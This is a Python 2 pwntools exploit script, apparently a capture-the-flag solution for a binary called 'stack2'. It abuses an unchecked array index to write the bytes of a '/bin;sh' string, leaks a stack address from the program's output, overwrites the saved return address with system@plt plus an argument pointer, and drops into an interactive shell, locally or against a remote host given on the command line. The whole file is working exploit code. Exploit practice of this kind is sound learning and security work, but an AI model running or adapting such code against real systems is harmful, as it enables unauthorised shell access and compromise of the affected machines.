#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 0
arch_64 = 1
exe = "./stack2"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
#    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    libc = e.libc
    if arch_64:
        arena = 0x3c4b20
        context.arch = "amd64"
    else:
        arena = 0x1b2780
        context.arch = "i386"

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

def change(ind,num):
    ru("exit\n")
    sl("3")
    ru(":\n")
    sl(str(ind))
    ru(":\n")
    sl(str(num))

def convert_list(con):
    res = []
    for i in range(len(con)):
        res.append(int("0x"+con[i].encode('hex'),16))
    return res

def change_ret(con):
    start = 0x84
    for i in range(len(con)):
        change(start+i,con[i])

def change_sh(con):
    start = -0xf7df4e48
    for i in range(len(con)):
        change(start+i,con[i])

def n2a(num):
    num = int(num)
    if num<0:
        num = 256 + num
    return hex(num)[2:]

ru(":\n")
sl("150")
#sl("12")

ru("numbers")

#for i in range(12):
#    sl("65")

for i in range(93):
    sl("65")
sl("47") #/
sl("98") #b
sl("105") #i
sl("110") #n
#sl("47") #/
sl("59") #/
sl("115") #s
sl("104") #h


# change ret
'''
change(0x84,0x9b)
change(0x85,0x85)
change(0x86,0x04)
change(0x87,0x08)
'''

ru("exit\n")
sl("1")


ru("108\t\t")
c1 = ru("\n")[:-1]
ru("109\t\t")
c2 = ru("\n")[:-1]
ru("110\t\t")
c3 = ru("\n")[:-1]

stack = "0xff"+n2a(c3)+n2a(c2)+n2a(c1)
stack = int(stack,16)-0x26 -5  # 存放sh的地址


sys_plt = e.plt["system"]

con = p32(sys_plt)+"aaaa"+p32(0x8048987)
con_list = convert_list(con)
change_ret(con_list)

ru("exit\n")
sl("5")

p.interactive()




